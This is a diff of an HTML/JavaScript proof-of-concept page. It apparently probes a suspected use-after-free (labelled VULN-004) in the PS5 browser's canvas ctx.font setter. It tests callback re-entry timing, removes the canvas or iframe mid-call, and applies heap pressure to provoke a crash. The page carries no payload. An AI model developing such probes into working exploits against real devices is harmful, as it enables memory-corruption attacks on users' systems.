@@ -1,8 +1,9 @@
 <!doctype html>
+
 <html>
 <head>
 <meta charset="utf-8">
-<title>Canvas setFont Re-entry Timing Diagnostic</title>
+<title>Canvas setFont Pressure Diagnostic — PS5</title>
 <style>
 html {
   background: #0d0d0d;
@@ -20,6 +21,7 @@ h2 {
 .sub {
   color: #8b949e;
   margin-bottom: 12px;
+  line-height: 1.45;
 }
 .box {
   background: #161b22;
@@ -29,15 +31,15 @@ h2 {
   margin: 10px 0;
 }
 #stage {
-  font-weight: bold;
-  font-size: 18px;
   color: #d29922;
+  font-weight: bold;
+  font-size: 17px;
 }
 #log, #previous {
   white-space: pre-wrap;
   word-break: break-word;
-  min-height: 160px;
-  max-height: 520px;
+  min-height: 170px;
+  max-height: 540px;
   overflow-y: auto;
 }
 .ok { color: #3fb950; }
@@ -47,6 +49,9 @@ h2 {
 .hit {
   color: #ff7b72;
   font-weight: bold;
+  background: #3d1f1f;
+  padding: 1px 4px;
+  border-radius: 4px;
 }
 button {
   background: #21262d;
@@ -56,61 +61,56 @@ button {
   padding: 10px 18px;
   font-family: inherit;
   font-size: 13px;
+  cursor: pointer;
 }
 button:disabled {
   opacity: .45;
+  cursor: default;
 }
 canvas {
   border: 1px solid #30363d;
-  margin-top: 8px;
+  margin: 4px;
 }
 </style>
 </head>
 <body>
-
-<h2>Canvas setFont Re-entry Timing Diagnostic</h2>
+<h2>Canvas setFont Pressure Diagnostic — PS5</h2>
 <div class="sub">
-Diagnostic-only. Goal: determine whether JS callbacks fire inside <code>ctx.font</code> / WebKit <code>setFont()</code>, or only before/after it.
+Diagnostic-only test for <code>CanvasRenderingContext2D.font</code> lifetime behavior.<br>
+Goal: classify callback timing around <code>ctx.font</code>, then apply bounded heap pressure to detect crash, exception, or visible state corruption.
 </div>
-
 <div class="box">
   <div id="stage">Stage: idle</div>
+  <br>
   <button id="btn">▶ Run diagnostic</button>
 </div>
-
 <div class="box">
   <b>Current log</b>
   <pre id="log"></pre>
 </div>
-
 <div class="box">
-  <b>Previous persisted log</b>
+  <b>Previous persisted log / last checkpoint</b>
   <pre id="previous"></pre>
 </div>
-
 <script>
 "use strict";
-
-const STORAGE_KEY = "canvas-setfont-reentry-timing-log";
+const STORAGE_KEY = "ps5-canvas-setfont-pressure-log";
 const LAST_KEY = STORAGE_KEY + "-last";
-
 const stageEl = document.getElementById("stage");
 const logEl = document.getElementById("log");
 const previousEl = document.getElementById("previous");
 const btn = document.getElementById("btn");
-
 let seq = 0;
 let inSetFont = false;
 let currentProbe = "";
 let insideCallbackCount = 0;
-let beforeCallbackCount = 0;
-let afterCallbackCount = 0;
-let crashedOrStopped = false;
-
-function now() {
+let outsideCallbackCount = 0;
+let pressureRuns = 0;
+let exceptionCount = 0;
+let anomalyCount = 0;
+function ts() {
   return performance.now().toFixed(1).padStart(8);
 }
-
 function persist(line) {
   try {
     const old = localStorage.getItem(STORAGE_KEY) || "";
@@ -118,15 +118,13 @@ function persist(line) {
     localStorage.setItem(LAST_KEY, line);
   } catch (e) {}
 }
-
 function hardMark(msg) {
   try {
     localStorage.setItem(LAST_KEY, "[" + Date.now() + "] " + msg);
   } catch (e) {}
 }
-
 function log(msg, cls) {
-  const line = "[" + (++seq) + "] [" + now() + "ms] " + msg;
+  const line = "[" + (++seq) + "] [" + ts() + "ms] " + msg;
   const d = document.createElement("div");
   d.textContent = line;
   if (cls)
@@ -134,18 +132,17 @@ function log(msg, cls) {
   logEl.appendChild(d);
   logEl.scrollTop = logEl.scrollHeight;
   persist(line);
-  try { console.log(line); } catch (e) {}
+  try {
+    console.log(line);
+  } catch (e) {}
 }
-
 function stage(msg) {
   stageEl.textContent = "Stage: " + msg;
   log("STAGE => " + msg, "info");
 }
-
 function sep() {
   log("------------------------------------------------------------", "info");
 }
-
 function loadPrevious() {
   try {
     previousEl.textContent =
@@ -157,220 +154,287 @@ function loadPrevious() {
     previousEl.textContent = "localStorage unavailable: " + e.name + ": " + e.message;
   }
 }
-
 window.onerror = function(message, source, lineno, colno, error) {
   hardMark("window.onerror");
+  exceptionCount++;
   log("window.onerror: " + message + " at " + lineno + ":" + colno, "bad");
   if (error && error.stack)
     log("stack: " + error.stack, "bad");
 };
-
 window.onunhandledrejection = function(event) {
   hardMark("unhandledrejection");
+  exceptionCount++;
   log("unhandledrejection: " + event.reason, "bad");
 };
-
 window.addEventListener("beforeunload", function() {
   hardMark("beforeunload fired");
 });
-
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
 function makeCanvas(label) {
   const canvas = document.createElement("canvas");
-  canvas.width = 120;
-  canvas.height = 60;
-  canvas.setAttribute("data-probe", label);
+  canvas.width = 160;
+  canvas.height = 80;
+  canvas.setAttribute("data-label", label);
   document.body.appendChild(canvas);
-
   const ctx = canvas.getContext("2d");
   if (!ctx)
-    throw new Error("2D context unavailable");
-
+    throw new Error("2D canvas context unavailable");
   return { canvas, ctx };
 }
-
-function callbackTiming(label) {
-  let timing;
+function classifyCallback(label) {
   if (inSetFont) {
-    timing = "INSIDE ctx.font";
     insideCallbackCount++;
-  } else if (currentProbe) {
-    timing = "OUTSIDE ctx.font while probe active";
-    beforeCallbackCount++;
-  } else {
-    timing = "OUTSIDE probe";
-    afterCallbackCount++;
+    log("CALLBACK: " + label + " timing=INSIDE ctx.font currentProbe=" + currentProbe, "hit");
+    return true;
   }
-
-  log("CALLBACK: " + label + " timing=" + timing + " currentProbe=" + currentProbe, inSetFont ? "hit" : "warn");
-
-  return inSetFont;
+  outsideCallbackCount++;
+  log("CALLBACK: " + label + " timing=OUTSIDE ctx.font currentProbe=" + currentProbe, "warn");
+  return false;
 }
-
+function diagnosticHeapPressure(label, level) {
+  pressureRuns++;
+  hardMark(label + ": pressure start level=" + level);
+  log(label + ": diagnostic heap pressure START level=" + level, "warn");
+  const buffers = [];
+  const typed = [];
+  const strings = [];
+  try {
+    if (level === 1) {
+      for (let i = 0; i < 256; i++)
+        buffers.push(new ArrayBuffer(16 * 1024));
+      for (let i = 0; i < 128; i++)
+        typed.push(new Float64Array(1024));
+    } else if (level === 2) {
+      for (let i = 0; i < 512; i++)
+        buffers.push(new ArrayBuffer(32 * 1024));
+      for (let i = 0; i < 256; i++)
+        typed.push(new Uint8Array(8192));
+      for (let i = 0; i < 32; i++)
+        strings.push("S".repeat(256 * 1024));
+    } else {
+      for (let i = 0; i < 768; i++)
+        buffers.push(new ArrayBuffer(64 * 1024));
+      for (let i = 0; i < 512; i++)
+        typed.push(new Float64Array(2048));
+      for (let i = 0; i < 48; i++)
+        strings.push("T".repeat(512 * 1024));
+    }
+    log(label + ": allocations complete", "warn");
+  } catch (e) {
+    exceptionCount++;
+    log(label + ": pressure allocation exception: " + e.name + ": " + e.message, "bad");
+  }
+  buffers.length = 0;
+  typed.length = 0;
+  strings.length = 0;
+  hardMark(label + ": pressure complete");
+  log(label + ": diagnostic heap pressure COMPLETE", "warn");
+}
 function setFontWithSentinel(label, ctx, fontValue) {
-  log(label + ": ABOUT TO assign ctx.font = " + JSON.stringify(fontValue), "warn");
-
+  log(label + ": BEFORE ctx.font = " + JSON.stringify(fontValue), "warn");
+  hardMark(label + ": before ctx.font");
   currentProbe = label;
   inSetFont = true;
-  hardMark(label + ": before ctx.font assignment");
-
+  let returned = false;
   try {
     ctx.font = fontValue;
-    hardMark(label + ": after ctx.font assignment");
-    log(label + ": ctx.font assignment returned; ctx.font=" + JSON.stringify(ctx.font), "ok");
+    returned = true;
+    hardMark(label + ": after ctx.font");
+    log(label + ": AFTER ctx.font returned; ctx.font=" + JSON.stringify(ctx.font), "ok");
   } catch (e) {
-    hardMark(label + ": ctx.font threw");
+    exceptionCount++;
+    hardMark(label + ": ctx.font exception");
     log(label + ": EXCEPTION from ctx.font: " + e.name + ": " + e.message, "hit");
   } finally {
     inSetFont = false;
     currentProbe = "";
   }
+  return returned;
 }
-
-async function smallDelay(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
+function validateContext(label, ctx) {
+  log(label + ": validating ctx state", "info");
+  try {
+    const fontValue = ctx.font;
+    log(label + ": ctx.font read=" + JSON.stringify(fontValue), "info");
+    if (!fontValue || fontValue.indexOf("\u0000") !== -1) {
+      anomalyCount++;
+      log(label + ": ANOMALY: suspicious font string", "hit");
+    }
+  } catch (e) {
+    exceptionCount++;
+    log(label + ": ctx.font read exception: " + e.name + ": " + e.message, "hit");
+  }
+  try {
+    const width = ctx.measureText("PS5 Canvas Diagnostic").width;
+    log(label + ": measureText width=" + width, isFinite(width) && width > 0 ? "ok" : "hit");
+    if (!isFinite(width) || width <= 0) {
+      anomalyCount++;
+      log(label + ": ANOMALY: invalid measureText width", "hit");
+    }
+  } catch (e) {
+    exceptionCount++;
+    log(label + ": measureText exception: " + e.name + ": " + e.message, "hit");
+  }
 }
-
 /*
- * Probe 1:
- * Reproduce the previous customElements pattern, but classify exact timing.
- * If connectedCallback fires before ctx.font, it is NOT evidence of setFont re-entry.
+ * Test 1:
+ * Parent custom element timing.
+ * Important result: callback timing must be INSIDE ctx.font to matter.
  */
-async function probeCustomElementParent() {
+async function testParentCustomElement() {
   sep();
-  stage("Probe 1: parent custom element timing");
-
-  const { canvas, ctx } = makeCanvas("probe1");
-  const tag = "x-canvas-timing-parent-" + Date.now();
-
+  stage("T1 parent custom element timing");
+  const { canvas, ctx } = makeCanvas("T1");
+  const tag = "x-ps5-canvas-t1-" + Date.now();
   const trigger = document.createElement(tag);
   document.body.appendChild(trigger);
-  log("[P1] inserted unresolved custom element before define()", "info");
-
+  log("T1: inserted unresolved parent custom element", "info");
   customElements.define(tag, class extends HTMLElement {
     connectedCallback() {
-      const inside = callbackTiming("[P1] connectedCallback");
+      const inside = classifyCallback("T1 connectedCallback");
       if (inside) {
-        log("[P1] INSIDE ctx.font: removing canvas", "hit");
+        log("T1: callback inside ctx.font; removing canvas and applying pressure", "hit");
         try { canvas.remove(); } catch (e) {}
+        diagnosticHeapPressure("T1-inside", 2);
       }
     }
   });
-
-  log("[P1] customElements.define() returned", "info");
-
-  setFontWithSentinel("[P1]", ctx, "18px sans-serif");
-
+  log("T1: customElements.define returned", "info");
+  setFontWithSentinel("T1", ctx, "18px sans-serif");
+  validateContext("T1", ctx);
   try { trigger.remove(); } catch (e) {}
   try { canvas.remove(); } catch (e) {}
-
-  await smallDelay(50);
+  await sleep(60);
 }
-
 /*
- * Probe 2:
- * Try iframe-local custom element registry.
- * This avoids the earlier ambiguity where parent registry and iframe document differ.
+ * Test 2:
+ * Iframe-local custom element timing.
  */
-async function probeIframeCustomElement() {
+async function testIframeCustomElement() {
   sep();
-  stage("Probe 2: iframe custom element timing");
-
+  stage("T2 iframe-local custom element timing");
   const iframe = document.createElement("iframe");
   iframe.style.cssText = "width:1px;height:1px;position:absolute;left:-9999px";
   document.body.appendChild(iframe);
-
-  iframe.srcdoc = "<!doctype html><html><body><canvas id='c' width='120' height='60'></canvas></body></html>";
-
-  await new Promise(resolve => {
-    iframe.onload = resolve;
-  });
-
+  iframe.srcdoc = "<!doctype html><html><body><canvas id='c' width='160' height='80'></canvas></body></html>";
+  await new Promise(resolve => { iframe.onload = resolve; });
   const iwin = iframe.contentWindow;
   const idoc = iframe.contentDocument;
-  const canvas = idoc.getElementById("c");
-  const ctx = canvas.getContext("2d");
-
-  if (!ctx) {
-    log("[P2] iframe ctx unavailable", "bad");
+  if (!iwin || !idoc) {
+    anomalyCount++;
+    log("T2: iframe not accessible", "bad");
     try { iframe.remove(); } catch (e) {}
     return;
   }
-
-  const tag = "x-canvas-timing-iframe-" + Date.now();
+  const canvas = idoc.getElementById("c");
+  const ctx = canvas.getContext("2d");
+  if (!ctx) {
+    anomalyCount++;
+    log("T2: iframe ctx unavailable", "bad");
+    try { iframe.remove(); } catch (e) {}
+    return;
+  }
+  const tag = "x-ps5-canvas-t2-" + Date.now();
   const trigger = idoc.createElement(tag);
   idoc.body.appendChild(trigger);
-  log("[P2] inserted unresolved custom element inside iframe", "info");
-
+  log("T2: inserted unresolved custom element inside iframe", "info");
   iwin.customElements.define(tag, class extends iwin.HTMLElement {
     connectedCallback() {
-      const inside = callbackTiming("[P2] iframe connectedCallback");
+      const inside = classifyCallback("T2 iframe connectedCallback");
       if (inside) {
-        log("[P2] INSIDE ctx.font: removing iframe", "hit");
+        log("T2: callback inside ctx.font; removing iframe and applying pressure", "hit");
         try { iframe.remove(); } catch (e) {}
+        diagnosticHeapPressure("T2-inside", 2);
       }
     }
   });
-
-  log("[P2] iframe customElements.define() returned", "info");
-
-  setFontWithSentinel("[P2]", ctx, "18px serif");
-
+  log("T2: iframe customElements.define returned", "info");
+  setFontWithSentinel("T2", ctx, "18px serif");
+  validateContext("T2", ctx);
   try { iframe.remove(); } catch (e) {}
-
-  await smallDelay(50);
+  await sleep(60);
 }
-
 /*
- * Probe 3:
- * MutationObserver timing around ctx.font.
- * This should normally be async, but the result is useful.
+ * Test 3:
+ * Detached canvas context stability + post pressure.
  */
-async function probeMutationObserver() {
+async function testDetachedContextPostPressure() {
   sep();
-  stage("Probe 3: MutationObserver timing");
-
-  const { canvas, ctx } = makeCanvas("probe3");
-
-  let observerHit = false;
-  const mo = new MutationObserver(() => {
-    observerHit = true;
-    const inside = callbackTiming("[P3] MutationObserver");
-    if (inside) {
-      log("[P3] INSIDE ctx.font: removing canvas", "hit");
-      try { canvas.remove(); } catch (e) {}
+  stage("T3 detached context + post pressure");
+  const { canvas, ctx } = makeCanvas("T3");
+  try {
+    canvas.remove();
+    log("T3: canvas removed before ctx.font; JS ctx reference still alive", "warn");
+  } catch (e) {
+    log("T3: canvas.remove exception: " + e.name + ": " + e.message, "bad");
+  }
+  setFontWithSentinel("T3", ctx, "20px Georgia");
+  diagnosticHeapPressure("T3-post", 2);
+  await sleep(0);
+  validateContext("T3", ctx);
+  await sleep(60);
+}
+/*
+ * Test 4:
+ * Repeated setFont + bounded pressure.
+ * Not infinite, not aggressive.
+ */
+async function testRepeatedSetFontPressure() {
+  sep();
+  stage("T4 repeated setFont + bounded pressure");
+  const holder = document.createElement("div");
+  document.body.appendChild(holder);
+  const canvas = document.createElement("canvas");
+  canvas.width = 160;
+  canvas.height = 80;
+  holder.appendChild(canvas);
+  const ctx = canvas.getContext("2d");
+  if (!ctx) {
+    anomalyCount++;
+    log("T4: ctx unavailable", "bad");
+    try { holder.remove(); } catch (e) {}
+    return;
+  }
+  const fonts = [
+    "10px serif",
+    "12px sans-serif",
+    "14px monospace",
+    "16px Arial",
+    "18px Georgia",
+    "20px Times New Roman",
+    "22px Courier New"
+  ];
+  for (let i = 0; i < 50; i++) {
+    setFontWithSentinel("T4-iter-" + i, ctx, fonts[i % fonts.length]);
+    if (i % 10 === 5) {
+      try {
+        holder.removeChild(canvas);
+        holder.appendChild(canvas);
+        log("T4: detach/reattach at iteration " + i, "warn");
+      } catch (e) {
+        exceptionCount++;
+        log("T4: detach/reattach exception at " + i + ": " + e.name + ": " + e.message, "hit");
+      }
+      diagnosticHeapPressure("T4-loop-" + i, 1);
+      await sleep(0);
+      validateContext("T4-iter-" + i, ctx);
     }
-  });
-
-  mo.observe(document.body, { childList: true, subtree: true });
-
-  const marker = document.createElement("div");
-  marker.textContent = "mutation marker";
-  document.body.appendChild(marker);
-  log("[P3] DOM mutation queued before ctx.font", "info");
-
-  setFontWithSentinel("[P3]", ctx, "20px monospace");
-
-  await smallDelay(50);
-
-  log("[P3] MutationObserver hit=" + observerHit, observerHit ? "warn" : "ok");
-
-  mo.disconnect();
-  try { marker.remove(); } catch (e) {}
-  try { canvas.remove(); } catch (e) {}
+  }
+  validateContext("T4-final", ctx);
+  try { holder.remove(); } catch (e) {}
+  await sleep(60);
 }
-
 /*
- * Probe 4:
- * Font loading callbacks timing.
- * This tells us whether font events/promises can fire inside ctx.font.
+ * Test 5:
+ * Font callback timing around ctx.font.
  */
-async function probeFontCallbacks() {
+async function testFontCallbackTiming() {
   sep();
-  stage("Probe 4: document.fonts callback timing");
-
-  const { canvas, ctx } = makeCanvas("probe4");
-
-  const family = "CanvasTimingFont" + Date.now();
+  stage("T5 document.fonts callback timing");
+  const { canvas, ctx } = makeCanvas("T5");
+  const family = "PS5CanvasTimingFont" + Date.now();
   const style = document.createElement("style");
   style.textContent =
     "@font-face {" +
@@ -378,158 +442,131 @@ async function probeFontCallbacks() {
     " src: local('Arial'), local('Helvetica'), local('Times New Roman'), local('Courier New');" +
     " font-display: block;" +
     "}";
-
   document.head.appendChild(style);
-
   let loadingDoneHit = false;
   let readyHit = false;
-
   if (document.fonts) {
     document.fonts.onloadingdone = function() {
       loadingDoneHit = true;
-      callbackTiming("[P4] document.fonts.onloadingdone");
+      const inside = classifyCallback("T5 document.fonts.onloadingdone");
+      if (inside) {
+        log("T5: font callback inside ctx.font; applying pressure", "hit");
+        diagnosticHeapPressure("T5-inside-loadingdone", 2);
+      }
     };
-
     document.fonts.ready.then(function() {
       readyHit = true;
-      callbackTiming("[P4] document.fonts.ready.then");
+      const inside = classifyCallback("T5 document.fonts.ready.then");
+      if (inside) {
+        log("T5: fonts.ready inside ctx.font; applying pressure", "hit");
+        diagnosticHeapPressure("T5-inside-ready", 2);
+      }
     }, function(error) {
-      log("[P4] fonts.ready rejected: " + error, "bad");
+      exceptionCount++;
+      log("T5: document.fonts.ready rejected: " + error, "bad");
     });
   } else {
-    log("[P4] document.fonts unavailable", "warn");
+    log("T5: document.fonts unavailable", "warn");
   }
-
-  setFontWithSentinel("[P4]", ctx, "24px " + family);
-
-  await smallDelay(250);
-
-  log("[P4] onloadingdone hit=" + loadingDoneHit + ", fonts.ready hit=" + readyHit, "info");
-
+  setFontWithSentinel("T5", ctx, "24px " + family);
+  await sleep(300);
+  log("T5: loadingDoneHit=" + loadingDoneHit + ", readyHit=" + readyHit, "info");
+  validateContext("T5", ctx);
   try { style.remove(); } catch (e) {}
   try { canvas.remove(); } catch (e) {}
+  await sleep(60);
 }
-
 /*
- * Probe 5:
- * Detach canvas before ctx.font, then call ctx.font.
- * This checks whether a detached but JS-referenced context remains stable.
+ * Test 6:
+ * Guarded recursive ctx.font only if a callback is truly inside setter.
  */
-async function probeDetachedContext() {
+async function testGuardedRecursiveOnlyIfInside() {
   sep();
-  stage("Probe 5: detached canvas context stability");
-
-  const { canvas, ctx } = makeCanvas("probe5");
-
-  canvas.remove();
-  log("[P5] canvas removed before ctx.font; JS ctx reference still alive", "warn");
-
-  setFontWithSentinel("[P5]", ctx, "18px Georgia");
-
-  try {
-    const w = ctx.measureText("PS5").width;
-    log("[P5] measureText after detach width=" + w, isFinite(w) && w > 0 ? "ok" : "hit");
-  } catch (e) {
-    log("[P5] measureText after detach threw: " + e.name + ": " + e.message, "hit");
-  }
-
-  await smallDelay(50);
-}
-
-/*
- * Probe 6:
- * Recursive ctx.font only if a callback actually occurs inside setter.
- * Since most callbacks are expected outside setter, this should stay quiet.
- */
-async function probeGuardedRecursive() {
-  sep();
-  stage("Probe 6: guarded recursive setFont");
-
-  const { canvas, ctx } = makeCanvas("probe6");
-  const tag = "x-canvas-recursive-" + Date.now();
+  stage("T6 guarded recursive setFont");
+  const { canvas, ctx } = makeCanvas("T6");
+  const tag = "x-ps5-canvas-t6-" + Date.now();
   let depth = 0;
-
   const trigger = document.createElement(tag);
   document.body.appendChild(trigger);
-
   customElements.define(tag, class extends HTMLElement {
     connectedCallback() {
-      const inside = callbackTiming("[P6] connectedCallback");
+      const inside = classifyCallback("T6 connectedCallback");
       if (inside && depth < 2) {
         depth++;
-        log("[P6] INSIDE ctx.font: recursive ctx.font depth=" + depth, "hit");
+        log("T6: recursive ctx.font depth=" + depth, "hit");
         try {
-          ctx.font = (12 + depth) + "px monospace";
-          log("[P6] recursive ctx.font returned depth=" + depth, "warn");
+          ctx.font = (14 + depth) + "px monospace";
+          log("T6: recursive ctx.font returned depth=" + depth, "warn");
         } catch (e) {
-          log("[P6] recursive ctx.font threw: " + e.name + ": " + e.message, "hit");
+          exceptionCount++;
+          log("T6: recursive ctx.font exception: " + e.name + ": " + e.message, "hit");
         }
+        diagnosticHeapPressure("T6-inside-depth-" + depth, 1);
         depth--;
       }
     }
   });
-
-  setFontWithSentinel("[P6]", ctx, "16px Arial");
-
+  setFontWithSentinel("T6", ctx, "16px Arial");
+  validateContext("T6", ctx);
   try { trigger.remove(); } catch (e) {}
   try { canvas.remove(); } catch (e) {}
-
-  await smallDelay(50);
+  await sleep(60);
 }
-
 async function runAll() {
   btn.disabled = true;
   seq = 0;
   insideCallbackCount = 0;
-  beforeCallbackCount = 0;
-  afterCallbackCount = 0;
-  crashedOrStopped = false;
-
+  outsideCallbackCount = 0;
+  pressureRuns = 0;
+  exceptionCount = 0;
+  anomalyCount = 0;
+  inSetFont = false;
+  currentProbe = "";
+  logEl.textContent = "";
   try {
     localStorage.removeItem(STORAGE_KEY);
   } catch (e) {}
-
-  logEl.textContent = "";
   loadPrevious();
-
   stage("started");
-  log("POC STARTED: Canvas setFont re-entry timing diagnostic", "info");
-  log("Important: only callbacks with timing=INSIDE ctx.font are relevant.", "warn");
-
-  await probeCustomElementParent();
-  await probeIframeCustomElement();
-  await probeMutationObserver();
-  await probeFontCallbacks();
-  await probeDetachedContext();
-  await probeGuardedRecursive();
-
+  hardMark("diagnostic started");
+  log("POC STARTED: Canvas setFont pressure diagnostic for PS5", "info");
+  log("This page is diagnostic-only: bounded memory pressure, no payloads, no fake objects.", "warn");
+  log("Relevant signal: CALLBACK timing=INSIDE ctx.font", "warn");
+  await testParentCustomElement();
+  await testIframeCustomElement();
+  await testDetachedContextPostPressure();
+  await testRepeatedSetFontPressure();
+  await testFontCallbackTiming();
+  await testGuardedRecursiveOnlyIfInside();
   sep();
   stage("summary");
-
   log("SUMMARY: insideCallbackCount=" + insideCallbackCount, insideCallbackCount ? "hit" : "ok");
-  log("SUMMARY: outsideCallbackCount=" + (beforeCallbackCount + afterCallbackCount), "info");
-
-  if (insideCallbackCount > 0) {
-    log("RESULT: INTERESTING — at least one callback fired while ctx.font assignment was in progress.", "hit");
-    log("NEXT: run this exact file under ASan WebKitTestRunner/MiniBrowser.", "warn");
-  } else {
-    log("RESULT: NO SYNCHRONOUS JS RE-ENTRY OBSERVED INSIDE ctx.font.", "ok");
-    log("INTERPRETATION: current VULN-004 UAF path is weak on this platform.", "ok");
+  log("SUMMARY: outsideCallbackCount=" + outsideCallbackCount, "info");
+  log("SUMMARY: pressureRuns=" + pressureRuns, "warn");
+  log("SUMMARY: exceptionCount=" + exceptionCount, exceptionCount ? "hit" : "ok");
+  log("SUMMARY: anomalyCount=" + anomalyCount, anomalyCount ? "hit" : "ok");
+  if (insideCallbackCount === 0 && exceptionCount === 0 && anomalyCount === 0) {
+    log("RESULT: No synchronous JS re-entry observed inside ctx.font; VULN-004 path is weak on this platform.", "ok");
+  } else if (insideCallbackCount > 0 && (exceptionCount > 0 || anomalyCount > 0)) {
+    log("RESULT: INTERESTING — inside callback plus exception/anomaly. Run this exact file under ASan.", "hit");
+  } else if (insideCallbackCount > 0) {
+    log("RESULT: Callback inside ctx.font observed. Needs ASan even if no visible crash.", "hit");
+  } else if (exceptionCount > 0 || anomalyCount > 0) {
+    log("RESULT: Exception/anomaly without inside callback. Needs manual review; may not be setFont UAF.", "warn");
   }
-
   log("NO CRASH OBSERVED", "ok");
   log("DONE", "ok");
-
+  hardMark("diagnostic done");
   btn.disabled = false;
 }
-
 btn.addEventListener("click", function() {
   runAll().catch(function(e) {
+    exceptionCount++;
     log("TOP LEVEL ERROR: " + e.name + ": " + e.message, "hit");
+    hardMark("top level error");
     btn.disabled = false;
   });
 });
-
 loadPrevious();
 hardMark("page loaded");
 </script>
